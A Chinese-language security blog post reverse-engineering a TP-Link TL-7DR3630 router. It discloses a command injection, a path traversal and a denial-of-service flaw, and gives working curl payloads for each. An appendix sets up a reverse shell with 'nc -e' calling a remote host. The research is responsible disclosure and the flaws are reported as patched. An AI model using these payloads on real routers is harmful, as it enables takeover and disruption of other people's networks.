---
title: (简中) 国行 TP-Link 路由器的漏洞研究
description: 逆向一台国行 TP-Link 路由器，并顺手挖到三个漏洞
date: 2026-06-09 00:00:02 +0800
---

### _**Hey! This article is also available in [English](/posts/hacking-tp-link-router-en/) and [繁體中文](/posts/hacking-tp-link-router-zh-tw/).**_

# 开头

前阵子，我逆向了一台国行 TP-Link 家用路由器，并顺手挖出了三个安全漏洞。它们分别是：

- 一个远程代码执行（RCE）漏洞
- 一个通过路径穿越实现的任意文件读取漏洞
- 一个拒绝服务（DoS）漏洞

这是我第一次在 CTF 之外挖到真实世界里的安全漏洞。希望这个故事读起来也会有点意思 :)

PoC 代码放在我的 [GitHub repository](https://github.com/ALaggyDev/TPLink-Vulns) 里。

# 路由器

**重要说明： TP-Link 有分两家公司：[TP-Link（国际）](https://www.tp-link.com/) 和 [TP-Link（中国）](https://www.tp-link.com.cn/)。这两家公司独立运营，产品也不一样。下文提到的 “TP-Link”，默认都是指 TP-Link（中国）。**

几个月前，我在淘宝上买了一台便宜的 TP-Link Wi-Fi 7 路由器，型号是 TL-7DR3630 V4.0，价格大概 200 人民币。

{% include image-caption.html src="/assets/img/tp-link/router.png" alt="Image of the router" caption="[TP-Link TL-7DR3630 V4.0](https://www.tp-link.com.cn/product_4081.html)" %}

在这个价位里，它大概是最划算的 Wi-Fi 7 路由器了。唯一比较可惜的是，因为中国大陆的频段限制，它不支持 6 GHz。

不过，既然这是面向中国市场的路由器，它出厂自然带的是锁得比较死的中文固件。我本来想给它刷 [OpenWrt](https://openwrt.org/)，但很遗憾，这台路由器只接受 TP-Link 签名过的固件更新。于是我决定把固件拿来逆向一下，看看里面有没有什么可以利用的漏洞。

之前我看到有人在类似型号的 TP-Link 路由器 TL-XDR6086 上找到过一个 [远程代码执行（RCE）漏洞](https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16)，后来还借这个漏洞给那台路由器编译了 OpenWrt。我当时也抱着类似的期待：如果能在我的型号上找到差不多的漏洞，说不定也能顺手把 OpenWrt 刷进去。*(但后来我发现，要给我这台路由器编译主线 OpenWrt 基本是不现实的。)*

# 逆向固件

首先，这个项目离不开前面那些研究者铺过的路。这里必须感谢这些很厉害的前辈和文章：

- [https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16](https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16)
- [https://bbs.kanxue.com/thread-289107.htm](https://bbs.kanxue.com/thread-289107.htm)
- [https://www.ctfiot.com/36044.html](https://www.ctfiot.com/36044.html)
- [https://www.m4rg4tr01d.tech/archives/tplink](https://www.m4rg4tr01d.tech/archives/tplink)
- [https://github.com/fishykz/TP-POC](https://github.com/fishykz/TP-POC)

我先从 TP-Link 官网下载了固件，然后把它解包。第一步当然是丢给 `binwalk` 看看：

```bash
└─$ binwalk TL-7DR3630\ V4.0_1.0.16_Build_20250717_Rel.74184.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
512           0x200           LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 439904 bytes
393728        0x60200         uImage header, header size: 64 bytes, header CRC: 0x118E985, created: 2025-07-17 13:22:35, image size: 4554040 bytes, Data Address: 0x80208000, Entry Point: 0x80208000, data CRC: 0x5EAFB8AF, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: "Linux-5.10.0"
393792        0x60240         Linux kernel ARM boot executable zImage (little-endian)
402945        0x62601         LZMA compressed data, properties: 0x6D, dictionary size: 1048576 bytes, uncompressed size: -1 bytes
4947832       0x4B7F78        Flattened device tree, size: 68116 bytes, version: 17
5009340       0x4C6FBC        Unix path: /usr/sbin/hi_dsp_ec.bin
5898752       0x5A0200        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 28819566 bytes, 2780 inodes, blocksize: 524288 bytes, created: 2025-07-17 13:22:52
```

可以看到，这个固件里至少有 Linux kernel、device tree，以及一个 SquashFS 文件系统。

接着我用 `dd` 把 SquashFS 文件系统切出来，再用 `unsquashfs` 解开：

```bash
dd if=TL-7DR3630\ V4.0_1.0.16_Build_20250717_Rel.74184.bin iflag=count_bytes,skip_bytes skip=5898752 count=28819566 of=filesystem.squashfs

unsquashfs filesystem.squashfs
```

解完之后，就可以开始逛文件系统了：

```bash
└─$ ls
autoPlugin  conf    data      dev  lib  opt      proc  root  sys  usr  web
bin         config  database  etc  mnt  overlay  rom   sbin  tmp  var  www
```

```bash
└─$ cat /etc/openwrt_release
DISTRIB_ID="OpenWrt"
DISTRIB_RELEASE="Chaos Calmer"
DISTRIB_REVISION="8be5e6b34e4f9163630aebaff3787e3274b888ed"
DISTRIB_CODENAME="chaos_calmer"
DISTRIB_TARGET="hsan/tiangong1"
DISTRIB_DESCRIPTION="OpenWrt Chaos Calmer 15.05.1"
```

```bash
└─$ ls conf
apdb.json                          hostapd                 server-cert.pem
behave_manage.cap                  hosts_info.cap          tdcpIntValList.json
cfgSyncBlackList.xml               model.xml               template
cfgSyncEncodeList.json             modulePrivateAttr.json  tp-link-root-CA.pem
cfgSyncWhiteList.xml               oem.xml                 vpn.cap
cloud_relay_client_capability.cap  priv-key.pem            wireless_ap.cap
common_module.cap                  protocol.cap            wireless.cap
digiCert-global-root-CA.pem        radio.cap               wpa_supplicant
flash_sign_pk.pem                  radioExtra.cap
```

这个固件基于 OpenWrt 15.05.1，已经是八年前的版本了。Linux kernel 版本是 5.10.0。虽然底子是 OpenWrt，但它和主线 OpenWrt 差异非常大，看起来 TP-Link 做了相当多的定制。

文件系统里有不少值得看的东西。`conf` 目录里是配置文件，包括证书和私钥；`lib` 目录里有很多 TP-Link 自己的逻辑；`web` 目录则是路由器 Web 管理界面的文件。

# dms 程式

根据我查到的资料，这套路由器的主要功能都在 `/bin/dms` 这个程式里。它负责处理 Web 管理界面，也负责一些其他功能。所以我决定先重点研究它。

```bash
└─$ file bin/dms
bin/dms: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, no section header

└─$ pwn checksec bin/dms
[!] Did not find any GOT entries
[*] '/home/laggy/TL-7DR3630/squashfs-root/bin/dms'
    Arch:       arm-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
```

我把 `dms` 扔进 Ghidra 里开始看。比较幸运的是，这个二进制没有被去除符号表（strip），所以大部分函数名还在。

![Ghidra view](/assets/img/tp-link/ghidra.png)

我的目标是找远程代码执行漏洞（RCE），所以先从所有可能执行 Linux 命令的函数调用入手：

- `system`
- `systemExec`
- `systemAsyncExec`
- `formattedExec`
- `popen`

这些函数加起来大概有 120 个调用点（XREF）。于是，我一个个手动看过去，检查有没有把用户输入拼进命令参数里的地方。

最后，我在 `vpnIppoolNotify` 函数里发现了这段代码：

![VPN IPPool](/assets/img/tp-link/command_injection.png)

简单来说，路由器的 VPN 配置里有一个叫 “IP Pool” 的功能。用户可以创建一个 IP Pool，并给它设置名称和 IP 范围。

当用户创建或删除 IP Pool 时，代码会使用这个格式字符串：`ippool-control -a -n %s -b %s -e %s`。第一个 `%s` 是 IP Pool 名称，第二和第三个 `%s` 分别是 IP 范围的起始和结束地址。然后代码会调用 `systemAsyncExec` 去执行拼出来的命令。

关键点来了：IP Pool 名称没有输入校验。也就是说，我们可以把命令注入到名称里，让路由器执行任意命令。RCE 到手！

为了测试，我创建了一个名字叫 `; reboot &` 的 IP Pool。拼出来的命令就变成了 `ippool-control -a -n ; reboot & -b 2.2.2.2 -e 2.2.2.2`。不出所料，路由器重启了。

```bash
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":"; reboot &","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<STOK_TOKEN>/ds
```

不过 IP Pool 名称最多只能有 32 个字符，超过的部分会被截断。所以 payload 需要写得比较省。

借助下一节会讲到的任意文件读取漏洞，我确认了命令是以 root 权限执行的。我创建了一个名字为 `; id > /tmp/hello &` 的 IP Pool，然后读取 `/tmp/hello`：

```bash
uid=0(root) gid=0(root)
```

这个漏洞能玩的东西不少。比如可以用它起一个反向 shell，让路由器连回我们的机器，从而拿到完整控制权。具体 payload 我放在了[附录](#appendix-reverse-shell-payload)里。

不过，这个漏洞必须由能访问路由器管理后台的用户触发，所以还没有那么严重。下面两个漏洞就更麻烦了 :)

# 任意文件读取

研究过程中，我还碰到了一个叫 `httpMGetHandle` 的函数：

![File read](/assets/img/tp-link/file_read.png)

这个函数负责处理 1900 端口上的 HTTP GET 请求，也就是 UPnP 服务。它会从 GET 请求里取出路径，在前面拼上 `/web/upnp`，然后读取对应文件，并把文件内容放进 HTTP response 返回。

比如，如果我们请求 `http://192.168.1.1:1900/ifc.xml`，代码就会读取 `/web/upnp/ifc.xml`，然后返回它的内容。

问题是，请求路径同样没有输入校验。我们可以用 `../` 往上穿目录，读取路由器上的任意文件。这就是一个路径穿越漏洞！

例如，发送 GET 请求到 `http://192.168.1.1:1900/../../conf/model.xml`，就可以读取 `/conf/model.xml`。

```bash
└─$ curl --path-as-is "http://192.168.1.1:1900/../../conf/oem.xml"
<root>
<oem name="oem_info">
        <device name="7dr3630mv4">
                <element name="fullName">TP-LINK Wireless Router TL-7DR3630</element>
...
```

*注意：普通 HTTP 客户端可能会规范化路径（path normalization），把 `../` 这类片段去掉。用 `curl` 测试时需要加 `--path-as-is`，让它原样发送路径。*

可惜的是，这个路径穿越漏洞没有看起来那么强。对于未认证用户，代码会检查文件扩展名。也就是说：

- 未认证用户（没有登录管理后台的用户）只能读取这些扩展名的文件：`.xml .gif .png .jpeg .ico .jpg .css .js .zip .eot .svg .ttf .woff`。
- 已认证用户没有文件扩展名限制。

已认证用户可以用类似下面的命令读取路由器上的任意文件：

```bash
curl --path-as-is "http://192.168.1.1:1900/stok=<STOK_TOKEN>/../../etc/passwd"
```

所以还算幸运的是，这个漏洞不能直接用来提权，因为在没有管理后台访问权限的情况下，读不到密码文件之类的敏感文件。

# 一个 HTTP 请求崩溃路由器

我在测试路径穿越漏洞时，随手给路由器发了这个 HTTP GET 请求：`http://192.168.1.1:1900/../../etc/passwd?stok=abc`。结果路由器瞬间崩溃。我居然用一个简单的 GET 请求把自己的路由器搞崩溃了。

这就必须得查清楚了。利用前面两个漏洞，我拿到了 `dms` 崩溃时的 [core dump](https://en.wikipedia.org/wiki/Core_dump) 并下载下来。用 `gdb` 分析之后，可以很明显地看到，崩溃是同一个 `httpMGetHandle` 函数里的 assertion failure 导致的。

{% include image-caption.html src="/assets/img/tp-link/dos_2.png" alt="Assertion failure" caption="触发崩溃的 assertion" %}

这个 assertion 会检查 `context->path` 是否非空。如果 `context->path` 为空，assertion 就会失败，然后路由器崩溃。

既然路由器是在这里崩溃的，那说明 `context->path` 当时一定是空字符串。但为什么这个 URL 会让 `context->path` 变空？

我继续往下挖 TP-Link 的 HTTP 解析实现。在 `httpParseHeader` 函数里，有这样一段解析 URL 中 `stok` token（用于认证）的代码：

{% include image-caption.html src="/assets/img/tp-link/dos_1.png" alt="stok parsing" caption="`stok` token 解析逻辑" %}

一个典型的已认证请求长这样：`http://192.168.1.1/stok=<STOK_TOKEN>/ds`。代码会在 URL 中寻找 `stok` token。如果找到了，它会继续寻找 token 后面的下一个 `/` 字符，然后把 `context->path` 设置成这个 `/` 后面的字符串（也就是 `/ds`）。

但是，如果 `stok` token 后面没有 `/`，代码就会在无意中把 `context->path` 设置成空字符串。我们的 URL 正好就是这种情况，因为 `stok` 后面没有再出现 `/`。开发者大概没有考虑到这个情况，于是后面 assertion 一炸，整个路由器也跟着炸。

## 影响

不幸的是，这个漏洞任何用户都能触发，因为代码在解析 `stok` token 之前并不会检查 token 是否有效。也就是说，你只要在浏览器里打开：`http://192.168.1.1:1900/stok=abc`，路由器就会崩溃。

而且，路由器崩溃后不会自动重启。你必须手动拔电源再插回去，它才会重新开机。

这个影响还是挺严重的。假设你访问了一个恶意网站。网站在你看不见的地方跑一段 JavaScript，向 `http://192.168.1.1:1900/stok=abc` 发请求。啪，路由器崩溃了，而你完全不知道为什么。[^1]

[^1]: Chrome 最近实现了一个叫 [Local Network Access](https://developer.chrome.com/blog/local-network-access) 的保护机制，用来防止这类本地网络攻击。不过这只意味着攻击会对用户可见。例如，攻击者可以不在后台用 JavaScript 发请求，而是直接把用户重定向到这个 URL，来躲过这个保护机制。

再举个更简单的例子：有人给你发邮件或者短信，里面塞了这个恶意 URL，而你点开了，路由器又崩溃了。

这个漏洞还有不少其他利用方式，这里就留给读者自己发挥了。

# 附录：Reverse Shell Payload

*如果你对 reverse shell payload 不感兴趣，可以跳过这一节。*

用这个 RCE 漏洞做 reverse shell，會比想象中麻烦一些。我们需要解决几个问题：

- 命令 payload 最多只有 32 个字符，第 32 个字符之后的内容都会被截断。
- 内置的 `busybox` 功能非常残缺。`nc`、`curl`、`wget`、`base64` 都不在这个 `busybox` 里。
- 每条命令都会执行两次：创建 IP Pool 时执行一次，删除 IP Pool 时又执行一次。

幸好这台路由器里有个可以借用的东西。`/opt/game_acc/rootfs` 里有一个 chroot 环境，正常情况下是给“游戏加速”软件用的（网易那些加速器，你知道的）。在 `/opt/game_acc/rootfs/bin/busybox` 里，有一个完整的 `busybox`，里面包含我们需要的 CLI 工具。

不过，完整路径 `/opt/game_acc/rootfs/bin/busybox` 本身就已经 32 个字符了。所以我改用 `opt/*/*/*/busybox`，让 shell expansion 帮我把它展开成完整路径。

下面是实际在路由器上执行的命令：

```bash
ln -sf opt/*/*/*/busybox nc   # create a symlink /nc to busybox
ln -sf opt/*/*/*/busybox sh   # create a symlink /sh to busybox
/nc <remote_ip> 99 -e /sh     # create a reverse shell to our machine on port 99
```

在自己的机器上监听 99 端口：

```bash
nc -lvnp 99
```

原始 payload：

```bash
# 把 <remote_ip> 替换成 IP 地址，把 <stok> 替换成 STOK token
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox nc&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";/nc <remote_ip> 99 -e /sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
```

```bash
exec 2>&1
echo hello can you read this
hello can you read this
```

Reverse shell 拿到了！从这里开始，我们就完全控制这台路由器了 :D

# 总结

这次研究里，我在国行 TP-Link 的家用路由器软件中发现了三个漏洞：

- VPN IP Pool 功能里的远程代码执行（RCE）漏洞
- UPnP 服务里的任意文件读取漏洞
- UPnP 服务里的拒绝服务（DoS）漏洞

我已经把这些漏洞报告给 TP-Link，他们也已经修复这些漏洞。我也把发现提交给了 [MITRE CVE Program](https://cve.mitre.org/)，不过到目前为止还没有收到回复。如果之后分配了 CVE ID，我会再更新这篇文章的。

时间线：

- 2026-04-28：通过邮件向 TP-Link 报告漏洞
- 2026-05-12：TP-Link 修复漏洞
- 2026-05-19：向 MITRE CVE Program 提交发现
- 2026-06-09：发布这篇文章

这次研究基本是在没有 LLM 辅助的情况下完成的，而且我只花了大概三天就找到了这些漏洞。过程很有趣，但也有点令人担忧。如果这种漏洞纯靠手工都能这么快挖出来，那么 AI 辅助的漏洞研究大概会让这类工作变得更快。防守方会更快，攻击者也一样。

我也觉得，这件事多少能反映出消费级路由器固件的现状。这些设备常年待在网络边界，插上之后就很容易被忘掉。可是说到安全，它们经常又是被忽视的那一类。现在市场上大多数路由器都跑着闭源的专有软件，也没有很多安全研究员专门盯着这类设备做分析。随着漏洞发现的成本越来越低、速度越来越快，厂商真的需要更认真地对待固件安全了。

总之，希望你觉得这个故事有趣。谢谢你的阅读！

链接：

- [GitHub](https://github.com/ALaggyDev)
- [Repo](https://github.com/ALaggyDev/TPLink-Vulns)
